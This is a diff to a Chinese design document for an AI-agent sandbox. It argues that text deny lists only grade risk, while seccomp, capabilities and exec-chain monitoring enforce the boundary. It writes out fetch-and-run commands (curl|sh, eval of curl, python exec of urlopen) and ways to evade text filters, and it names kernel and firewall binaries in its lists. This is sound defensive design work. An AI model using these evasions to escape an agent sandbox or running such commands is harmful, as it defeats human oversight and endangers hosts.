@@ -48,7 +48,30 @@
      - `check_available` 在该情形返回 `{ layer="backend", fallback="approval" }` 作为契约信号；
        `process_prefix` 直接返回明确错误（不再构造任何前缀）。
      - 不再提供 `tools.sandbox.allow_unisolated` 逃生开关：无隔离即退回审批，由审批弹窗把关。
-   - 文本匹配（`risk.deny_reason` 等）仅做审批分级，**绝不冒充安全边界**，不新增危险命令文本名单。
+6. **安全边界只能由内核/运行时强制提供**：seccomp 基线、capability 档位、命名空间与设备隔离、
+   cgroup 资源域与 `cgroup.kill`、网络门禁、人工审批。字符串/正则/命令名黑名单**不得作为拒绝依据**
+   ——它判定的是命令「长什么样」，而非进程「实际做了什么」，故在同一条轴的两个方向上都失效：
+   - **误报**（实测：`nvim --headless` 加载真实 `script_scan` + `risk.deny_reason`）：仅打印字符的
+     `echo 'curl -LsSf https://x/u.sh | sh'`、在文档里搜这段文本的 `grep -n 'curl .* | sh' README.md`、
+     写备注文件的 `printf '%s\n' 'wget -qO- x | sh' > notes.txt`，三者均被判
+     `DESTRUCTIVE:PIPE_TO_SHELL` 拒绝；仅查看帮助/版本的 `kmod --help`、`perf --version`、
+     `bpf --help` 均被判 `KERNEL_COMMAND` 拒绝。
+   - **漏报**（同实测，全部放行）：变量间接 `SH=bash; curl -LsSf https://x/u.sh | $SH`、引号拼接
+     `curl -LsSf https://x/u.sh | ba""sh`、命令替换 `eval "$(curl -LsSf https://x/u.sh)"`、
+     先落盘再引用 `curl -LsSf https://x/u.sh -o /tmp/u.sh && source /tmp/u.sh`、语言内拉取执行
+     `python3 -c "import urllib.request as u,os;exec(u.urlopen('https://x/u.py').read())"`。
+   - **名字表亦多余**：`DENY_BINS` 中每个二进制所需的危险 syscall（`init_module`、`finit_module`、
+     `delete_module`、`reboot`、`kexec_load`、`bpf`、`perf_event_open`、`swapon`/`swapoff`…）都已被
+     seccomp 基线拦截（§12），故名字表拦不住任何 seccomp 拦不住的东西，只产出上面那类误报；
+     `iptables`/`nft` 的真实约束是 `CAP_NET_ADMIN`——busybox 软链可绕过名字，但绕不过 `EPERM`。
+   - 因此字符串匹配**只允许**用于两件事：**风险分级**（提升 L 级）与**提示文案**；命中最多导致
+     **强制人工复核**（`needs_confirm` + 同步审批），**绝不导致拒绝执行**。
+   - 危险二进制以**能力事实**（所需被剥夺的 syscall / capability）定义，**不以名字定义**。
+   - 动态侧只做**观测 + 补救**：exec 调用链守卫（见「动态调用链判定」）以真实 `execve` 链归因并
+     `cgroup.kill` 整树终止，但副作用可能已发生一次，**不等价于 seccomp 的发生前拦截**；classic
+     seccomp 无法解引用路径参数，「按二进制路径发生前拦截」只能由 LSM/bwrap 提供。
+   - 无任何动态强制层（既无 seccomp 又无 eBPF backstop）时**强制 `approval_mode="prompt"`**（同步
+     事前人工审批），**绝不启用 `async`** 的「先执行后审批」，绝不静默降级。
 
 ## 2. 模块结构
 
@@ -82,7 +105,8 @@
 | `sandbox/execution/tool_spec.lua` | 每个工具的影响类别（effect）与暂存路径声明 |
 | `sandbox/execution/wrapper.lua` | 执行门禁：`attach` 附加规格、`gate` 强制过闸门 |
 | `sandbox/review/risk.lua` | 安全级别评估（L0-L3）、审批分级动作与结果分级 |
-| `sandbox/observe/script_scan.lua` | 脚本间接执行静态扫描（Shell 正文 + 高级语言内嵌 shell、递归、不透明判定） |
+| `sandbox/observe/script_scan.lua` | 脚本间接执行的静态形迹扫描（Shell 正文 + 高级语言内嵌 shell、递归、不透明判定）；**仅供风险放大器，不产生拒绝**（不变量 6） |
+| `sandbox/observe/exec_guard.lua` | 动态 exec 调用链守卫：消费 `execve`/`execveat` 事件，按能力（非名字）归类，归因后 `cgroup.kill`；属观测 + 补救，不等价于 seccomp |
 | `sandbox/observe/audit.lua` | AI 读取/调用行为监视、风险分与异常事件 |
 | `sandbox/execution/container.lua` | 容器运行时受控：与沙箱同 namespace（podman），docker/nerdctl 改写为 podman |
 
@@ -631,21 +655,25 @@ token（`NEOKEY_…`）或格式保真假密钥时**拒绝写盘**（`SECRET_TOK
   `child_process.exec`/`system`/反引号/`%x{}` 等 shell 调用的字符串字面量；
 - 递归扫描被引用的脚本（限 `max_depth`/`max_files`/`max_bytes`，检测环）。
 
-折叠出的 `effective` 文本并入 `risk.deny_reason`（硬拒绝）、`privilege.classify`（档位/包
-识别）与 `risk.classify`（安全级别），使 `bash deploy.sh` 里的 `pip install`、
-`sudo modprobe`、`mkfs.ext4 /dev/sdb1` 不再漏判：
+折叠出的 `effective` 文本**只用于风险放大**（`privilege.classify` 的档位/包识别、`risk.classify`
+的安全级别与提示文案），**不产生任何拒绝**：
 
-- 脚本内**设备级/内核命令硬拒绝**（与直接命令同规则）；`rm`/`rm -rf` 等纯文件修改不硬拒绝
-  （由整机根 overlay 修改暂存保护宿主机），其效果冻结为候选待审；
-- 其余命中（包安装、`systemctl`、`chmod -R 777` 等）提升级别并**强制复核**——不随
-  `mode=commit`、任务授权或会话自动审批放行；
+- 脚本内命中破坏性/内核形迹（`curl … | sh`、`modprobe`、`mkfs.ext4 /dev/sdb1` 等）→ **提升级别 +
+  强制人工复核**（`needs_confirm` 与同步审批），不随 `mode=commit`、任务授权或会话自动审批放行；
+- `rm`/`rm -rf` 等纯文件修改不提升为拒绝（由整机根 overlay 修改暂存保护宿主机），其效果冻结为
+  候选待审；
 - 无法静态解析的间接执行（`eval`、`base64 -d | sh`、`curl … | sh`、`python -m`、
   动态 `-c "$VAR"`、读不到/超限的脚本）标记为**不透明**，提升到 L1（`OPAQUE_SCRIPT_EXECUTION`）
   并强制复核。
 
-> 本模块只做**静态**分析。不做运行时追踪：沙箱的 seccomp 基线拦 `ptrace`/`bpf`/`process_vm_*`，
-> 沙箱内 `strace`/eBPF 不可用，且 shim（`LD_PRELOAD`/PATH 包装）可被 AI 绕过；稳健的动态侧
-> 信号是**效果观测**（overlay 捕获的真实文件改动、网络目标、包路径识别），与本静态扫描互补。
+> **本模块不构成安全边界**（核心不变量 6）。它判定的是脚本正文的**文本形迹**，已实测双向失效：
+> 把危险命令当字面量处理的无害命令被误判（`echo 'curl x | sh'`、`grep 'curl .* | sh'`、
+> `printf '… | sh' > notes.txt`），而真正危险的形式全部漏判（变量间接 `| $SH`、引号拼接
+> `| ba""sh`、`eval "$(curl …)"`、先落盘再 `source`、`python3 -c exec(urlopen(...))`）。
+> 真实拦截由**内核/运行时强制层**承担：seccomp 基线拦 `init_module`/`bpf`/`perf_event_open`/
+> `mount`/`reboot` 等 syscall 与 `mknod` 设备位；设备门禁拦危险设备节点；exec 调用链守卫
+> （见下节）以真实 `execve` 链归因并 `cgroup.kill`；overlay 效果观测捕获真实文件改动。
+> 静态扫描的价值在于**把风险抬到人工复核**，不在于阻断。
 
 ### 危险设备访问门禁（`tools.sandbox.devices`，默认开）
 
@@ -665,11 +693,14 @@ UI 见 `ui/components/device_consent`，与网络同意/工具审批同款浮窗
   - 未批准则返回 `DEVICE_ACCESS_DENIED`（fail-closed）。
   - **常驻实例同样监测**：常驻命令服务器使用会话级 cgroup，门禁对其挂**常驻 eBPF 观测句柄**
     （随会话实例存活，避免每条命令重建 bpftrace 的固定开销；实例重建/关闭时自动重启/停止）。
-  - eBPF 后端不可用（非 root / 无 bpftrace/内核）时自动**回退静态命令文本扫描**。
+  - eBPF 后端不可用（非 root / 无 bpftrace/内核）时自动**回退命令文本解析**，但该回退只产出
+    **advisory 提示 + 强制同步审批**，不产生拒绝（见下条）。
 - **静态回退（`devices.dynamic=false` 或 eBPF 不可用）**：从（含脚本折叠后的 `effective`）命令
   文本抽取 `/dev/...` token，对 `devices.paths` 做 glob（`*`）匹配；`>` 重定向、`of=/dev/...`、
   引号均覆盖，无害设备（`/dev/null`、`/dev/urandom`、`/dev/zero` 等）永不命中。命中且未允许时
-  在执行前弹窗/拒绝。
+  按 `action` 弹窗询问——**拒绝的实际效力来自审批（人工）与设备绑定（`--dev-bind`）本身**，
+  文本解析只决定「是否值得打扰用户」，**不是安全边界**（核心不变量 6）：它漏判 `--mknod` 之外
+  的间接路径（变量拼接、`of=$DEV`、脚本内计算），也误判把设备路径当字面量处理的命令。
 - 默认 `action="ask"`：弹窗提供 **仅本次允许 / 本次会话允许该设备 / 拒绝**；`timeout_ms`（默认
   30000）内无应答则**自动阻止**（fail-closed）；headless / 无可用界面时同样失败关闭。
 - `action="deny"` 直接拒绝；`action="allow"` 直接放行并暴露设备（不弹窗）。
@@ -678,11 +709,48 @@ UI 见 `ui/components/device_consent`，与网络同意/工具审批同款浮窗
 - **本会话允许列表**：`devices.allowed`（内存，`config_store.set` 热更新、不写盘）。由弹窗
   「本次会话允许」或审批悬浮窗**「工具行为」页按 `E`** 打开的**设备组件编辑器**写入（`a` 添加
   / `d` 删除）。已在允许列表的设备在命令执行前预绑定、不再弹窗/阻断。
-- 该门禁针对**进程命令**的设备节点访问；内核命令（`modprobe`/`mkfs` 等）仍走既有的硬拒绝
-  （比弹窗更强），`mknod` 设备节点创建仍由 seccomp 基线拦（见「seccomp 基线与三层行为强制」；
-  防御层缺失时按三层模型降级并要求告警/审计，见该节）。
+- 该门禁针对**进程命令**的设备节点访问。内核命令（`modprobe`/`mkfs` 等）**不按名字硬拒**：
+  它们所需的 `init_module`/`finit_module`/`delete_module`/`mount` 等 syscall 由 seccomp 基线
+  拦截，设备写入目标由本节门禁与 `--dev` 最小 devtmpfs 约束，`mknod` 设备节点创建由 seccomp 的
+  `S_IFDEV` 位拦截（见「seccomp 基线与三层行为强制」）；防御层缺失时按三层模型降级并要求
+  告警/审计。命中相关文本形迹只**提升风险级别并要求人工复核**（核心不变量 6）。
 - 已知边界：并发常驻命令共享同一会话 cgroup，事件归因到「当前槽位」命令；极端并发下
   危险设备访问的终止可能作用于同一实例的当前命令（设备访问本就罕见）。
+
+### 动态调用链判定（`tools.sandbox.observe.exec_guard`，默认开）
+
+> 本节是核心不变量 6 的**动态侧**实现：用真实 `execve` 事件判定「哪个二进制被真正执行」，
+> 而不是解析命令字符串。属**观测 + 补救**——命中后 `cgroup.kill` 整树终止，但副作用可能已发生
+> 一次，**不等价于 seccomp 的发生前拦截**（第 1 层仍是 seccomp，见 §12）。
+
+`sandbox/observe/observer.lua` 的观测后端本就采集 exec 事件（eBPF `sys_enter_execve` /
+`sys_enter_execveat` 探针输出 `X` 帧；strace 的 `trace=…,execve` 经 `parse_strace_line` 解析），
+`sandbox/observe/exec_guard.lua` 消费这些事件：
+
+- **链构建**：以 `(pid, ppid)` 维护 `pid → { ppid, path, argv0, class }`（上限 `max_chain`，环形
+  淘汰最旧），把从根命令到当前进程的 `execve` 序列还原为调用链；`path` 取内核给出的**真实可执行
+  路径**并做有界 canonical 归一（`/proc/<pid>/exe` 不可读时退回事件路径），因此 `busybox iptables`、
+  软链、`$VAR` 间接、`eval` 派生等**文本层绕过都不影响判定**。
+- **按能力归类，不按名字**：归类依据是二进制**实际请求的 syscall / capability**（观测到的
+  `init_module`/`bpf`/`perf_event_open`/`mount` 命中，以及 `privilege.effective_caps` 给出的能力
+  档位），类别为 `module`（内核模块 / `sysctl` 写入）、`clock`（系统时钟）、`firewall`
+  （`CAP_NET_ADMIN` 网络管理）、`rawio`（裸端口 / 裸设备）、`mount`（挂载 / 命名空间）等。名字只
+  用于**提示文案**与风险分级，不参与裁决。
+- **裁决与归因**：命中危险能力时把证据归因到**具体 pid + 二进制 canonical path + argv0 + 所属
+  链**，写 evidence（`sandbox_behavior` 的 `exec_chain` 字段）并发 `SANDBOX_BEHAVIOR_VIOLATION`
+  事件，随后 `cgroup.kill` 整树终止（常驻实例用 `kill_current`）；本轮候选放弃、命令判失败。
+- **后端降级**：`ebpf(bpftrace)` → `strace` → **无**。eBPF 需 root + tracefs；strace 以命令前缀
+  包裹，会改变执行形态（常驻实例 / 后台进程识别受影响），故只在允许该形态的路径启用；两者都不
+  可用时 exec 守卫**如实缺失为「无动态强制层」**——此时按核心不变量 6 强制
+  `approval_mode="prompt"`（见「无任何隔离后端」），并写 `sandbox_degrade` + `SANDBOX_DEGRADED`，
+  绝不假装有边界。
+- **能力边界（务必如实理解）**：
+  - 观测是**尽力而为**：tracepoint 缺失、事件丢失、`procfs` 后端轮询采样漏掉瞬时进程、极短命进程
+    在探针就绪前已完成 exec，都可能漏采；不承诺无漏采。
+  - classic seccomp **无法解引用路径参数**（`filename` 是 `const char *`），因此「按二进制路径在
+    **发生前**拦截」只能由 LSM（`bpf`/`apparmor`/`selinux`）或 bwrap 提供，本模块做不到——它只能
+    在已经 exec 之后判、判完再杀。
+  - 因此 exec 守卫是**纵深防御**，不替代 seccomp 强制层；用户不应因它存在而降低审批严格度。
 
 ### 暂存机制
 
@@ -1635,6 +1703,10 @@ seccomp（含设备节点屏障）**——沙箱内进程看到的是一份「�
   反斜杠转义，并展开同一命令内 `NAME=value` 的简单变量（`c=--noproxy; curl $c`），防止静态
   扫描被拼接/变量绕过。`-x` 仅在 curl 段上等同 `--proxy`（`set -x`/`tar -x`/`grep -x`/
   `bash -x` 等非代理开关不再误报）。headless（无 attached UI）无法弹窗时失败关闭（拒绝）。
+  - **性质（核心不变量 6）**：这是**启发式文本判定**，规范化只能提高命中率、不能保证完备
+    （`f() { unset https_proxy; }; f`、脚本内动态拼接仍可绕过）。它的正当用途是**在很可能
+    降低安全档位时强制人工复核**，而不是充当边界；真正的边界是 netns + `host_local_block`
+    应用层过滤 + 上文的「非硬边界」声明。`"deny"` 属用户显式选择的收紧策略，非默认路径。
 - **残余信息泄露（共享 netns 固有）**：因 T0 共享宿主网络命名空间，`/proc/net/tcp`、
   `/proc/net/unix`（宿主连接/Unix socket 清单）、`ip addr`/`ip route`（netlink，宿主拓扑）
   对沙箱可见。`/proc/net` 是 `self/net` 符号链接，无法用挂载遮蔽；netlink 也不经挂载。
@@ -2370,9 +2442,13 @@ UI 未注册但为**交互式 Neovim** 时，回退到内建 `confirm` **暂停�
   `/tmp/ssh-*`、`~/.ssh`、`~/.ssh-agent` 等（agent 套接字被替换为字符设备，`connect` 失败）。
 - **清除环境变量**：外部命令前置 `unset SSH_AUTH_SOCK SSH_AGENT_PID`（`runtime.proxy_unset_snippet`
   始终生成该片段），使 `ssh`/`git` 无法借宿主 agent 认证。
-- **命令级硬拒绝**：`wrapper` 对 `ssh`/`scp`/`sftp`/`sshpass` 或 `ssh://` 指向本机
-  （`localhost`/`127.`/`::1`/`0.0.0.0`/`169.254.`）的命令直接拒绝（`SSH_LOCAL_SERVICE_DENIED`），
-  写证据与事件（共享 netns 下裸 TCP 不经代理，需命令级闸门）。远端 `ssh` 不受影响。
+- **命令级确认（启发式，非安全边界）**：`wrapper` 对 `ssh`/`scp`/`sftp`/`sshpass` 或 `ssh://`
+  指向本机（`localhost`/`127.`/`::1`/`0.0.0.0`/`169.254.`）的命令**暂停并弹窗询问**，写证据与
+  事件（共享 netns 下裸 TCP 不经代理，需额外一道闸门）。远端 `ssh` 不受影响。
+  - 该判定基于**命令文本**，因此按核心不变量 6 只作为**人工复核的触发器**，不冒充边界：它漏判
+    变量拼接（`h=127.0.0.1; ssh $h`）、脚本间接与别名；真实约束来自 netns 与上两条遮蔽/环境
+    清理（`SSH_AUTH_SOCK` 被清、agent 套接字被替换为字符设备，`connect` 直接失败）。
+  - `ssh://` 等 URL 形式则另由网络门禁按**解析后的目标地址**处理（见 §6.1 本机拦截）。
 - 分类上 `sshd`/`ssh-agent`/`ssh-add`/`ssh-keysign`/`gpg-agent` 属 T2 特权（主机效果需审批）。
 
 ## 17. 权限档位与自动提权
@@ -2543,18 +2619,27 @@ upper/work、暂存、会话）会 chown 到该 uid。
 `review`（进入异步待审，不阻塞 agent）/ `block`（硬拒绝）。默认 `default="review"`
 保持既有语义；可用 `tools.sandbox.approval.levels` 覆盖单级动作。
 
-- **内核/危险命令硬拒绝**（`risk.deny_reason`）：默认异步模式下，普通命令（`python`/`node`/
+- **内核/危险命令形迹 → 强制人工复核，不拒绝**：默认异步模式下，普通命令（`python`/`node`/
   `go`/`rust`/`apt`/`pip`/`npm` 等，含 T1/T2）**立即在沙箱内执行、不弹审批**，写入全部冻结为
-  候选；仅下列命令**直接拒绝、不执行**：内核模块/状态（`modprobe`/`insmod`/`rmmod`/`kmod`/
-  `modinfo`/`sysctl`/`kexec`/`reboot`/`shutdown`/`poweroff`/`halt`/`bpf`/`perf`）、`setcap`、
-  内核防火墙（`iptables`/`ip6tables`/`nft`/`arptables`/`ebtables`）、`swapon`/`swapoff`，
-  以及**绕过文件暂存层**的破坏性模式（`mkfs`、`dd of=/dev/*`、`> /dev/sd*`、fork 炸弹、
-  `curl … | sh` 等）。`rm`/`rm -rf` 等纯文件修改**不在硬拒绝列表**：只读根 + overlay 修改暂存
-  已保护宿主机，其删除效果冻结为待审候选（详见 §5 暂存机制）。
-  段首为 `sudo`/`doas`/`env`/`bash -c` 等包装器时会向下识别真实命令。`mount`/`umount` 仍按
-  T2 主机操作冻结为提案（审批后 `sudo` replay），`mknod`/`unshare` 等由 seccomp 与命名空间
-  隔离处理（见「seccomp 基线与三层行为强制」：防御层缺失时按三层模型降级 + 告警 + 审计），
-  不在硬拒绝列表内。
+  候选；命中下列**文本形迹**时**不拒绝、不改变执行路径**，只提升风险级别并置 `needs_confirm`
+  强制同步人工复核（不随 `mode=commit`、任务授权或会话自动审批放行）：内核模块/状态相关名
+  （`modprobe`/`insmod`/`rmmod`/`kmod`/`modinfo`/`sysctl`/`kexec`/`reboot`/`shutdown`/
+  `poweroff`/`halt`/`bpf`/`perf`）、`setcap`、防火墙工具（`iptables`/`ip6tables`/`nft`/
+  `arptables`/`ebtables`）、`swapon`/`swapoff`，以及**绕过文件暂存层**的破坏性模式（`mkfs`、
+  `dd of=/dev/*`、`> /dev/sd*`、fork 炸弹、`curl … | sh` 等）。
+  - 这些形迹**按名/按模式匹配**，实测既误报（`kmod --help`、`perf --version`、
+    `echo 'curl x | sh'`、`grep 'curl .* | sh'`）又漏报（`| $SH`、`| ba""sh`、`eval "$(curl …)"`、
+    先落盘再 `source`），故**不得作为拒绝依据**（核心不变量 6）。
+  - 真实拦截来自内核/运行时层：上述每个二进制所需的 `init_module`/`finit_module`/
+    `delete_module`/`reboot`/`kexec_load`/`bpf`/`perf_event_open`/`swapon`/`swapoff` 均已在
+    seccomp 基线中拦截；`iptables`/`nft` 的真实约束是 `CAP_NET_ADMIN`（busybox 软链能绕名字，
+    绕不过 `EPERM`）；设备写入由设备门禁 + `--dev` 最小 devtmpfs 约束；`mknod` 设备位由 seccomp
+    拦截；间接执行链由 exec 调用链守卫按真实 `execve` 归因（见「动态调用链判定」）。
+  - `rm`/`rm -rf` 等纯文件修改连级别都不提升：只读根 + overlay 修改暂存已保护宿主机，其删除
+    效果冻结为待审候选（详见 §5 暂存机制）。
+  - 段首为 `sudo`/`doas`/`env`/`bash -c` 等包装器时会向下识别真实命令——这同样只是**提高命中
+    率**，不构成边界。`mount`/`umount` 仍按 T2 主机操作冻结为提案（审批后 `sudo` replay），
+    `mknod`/`unshare` 等由 seccomp 与命名空间隔离处理（见「seccomp 基线与三层行为强制」）。
 
 - **包管理器专用识别 + 封顶 L2**：`apt`/`apt-get`/`dnf`/`pacman`/`pip`/`pipx`/`uv`/`poetry`/
   `conda`/`mamba`/`npm`/`npx`/`pnpm`/`yarn`/`bun`/`cargo`/`go`/`gem`/`composer` 等
@@ -2630,6 +2715,13 @@ seccomp 是**唯一**能拦住「不经 overlayfs 的效果」（典型：`mknod
   （如设备节点已创建、挂载已完成）；靠整机根 overlay/只读 + 候选冻结兜住写入面，但**不等价**
   于 seccomp 的发生前拦截。仅降级 `seccomp` 门禁与 unshare 的 `/proc/sys` 遮蔽门禁，其余门禁
   （后端缺失、网关、降权、档位挂载）仍**硬拒绝**。
+- **无任何动态强制层 → 强制同步事前审批**（核心不变量 6）：第 1、2 层同时不可用时，沙箱内已
+  不存在任何「运行时告诉我们要不要拦」的信号，因此**不得再用字符串匹配假装有边界**，也**不得**
+  继续 `tools.approval.mode="async"`（先执行、事后确认）：`executor` 强制把审批模式降为
+  `"prompt"`（同步事前人工审批，复用工具审批悬浮窗），并写 `sandbox_degrade` +
+  `SANDBOX_DEGRADED`（`layer="enforcement"`），**绝不静默**。用户显式配置的 `prompt`/`strict`/
+  `auto_allow` 予以保留（`strict` 更严，不降级）。这与「无命名空间隔离后端」分支的处置一致：
+  两种情形都退回到**人**作为唯一强制层。
 - **配置**（`tools.sandbox.seccomp`）：`enabled`（默认 true）、`filter_path`、`allow_namespaces`、
   `on_unavailable`（`"degrade"` 默认 | `"deny"` 恢复旧 fail-closed）、`backstop`（`"ebpf"` 默认 |
   `"off"`）、`require_backstop`（默认 false；true = 第 1、2 层均不可用时硬拒）。
